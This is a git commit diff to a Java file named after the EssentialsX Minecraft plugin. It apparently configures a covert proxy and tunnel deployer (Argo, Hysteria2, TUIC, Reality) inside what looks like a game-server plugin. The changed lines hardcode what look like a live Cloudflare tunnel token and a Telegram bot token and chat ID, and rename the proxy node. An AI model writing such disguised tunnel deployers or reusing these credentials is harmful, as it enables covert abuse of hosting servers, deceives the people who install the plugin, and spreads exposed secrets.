2939737d5e654cc057478c9f74b46b22ebe06bdc
xiatian327 <136238840+xiatian327@users.noreply.github.com>
2026-04-26 01:41:49 +0800

    更新 EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -82,17 +82,17 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "xserver3.king8888.nyc.mn");
         env.put("ARGO_AUTH", "eyJhIjoiYTBhNGUxYzQwYjBkYTdkODUyNWQ1MjI1YjllMzg0NDYiLCJ0IjoiNjQzMmNlMDMtNDkxOS00NGI5LWJhM2QtYmU4ZDlmMWFkZGJhIiwicyI6IlpqRTBOR0l5WTJZdE5UTmpOeTAwTTJReExXSXdPRGd0TWpVeE1XTTRNamRpTVRnNCJ9");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "25565");
-        env.put("TUIC_PORT", "25575");
+        env.put("HY2_PORT", "");
+        env.put("TUIC_PORT", "");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "25575");
+        env.put("REALITY_PORT", "");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "5848244735");
         env.put("BOT_TOKEN", "7799976927:AAHY1DDudQzUTdwkvTAZ8OAy2zHvULCtTX0");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "Xserver");
+        env.put("NAME", "MineKeep");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
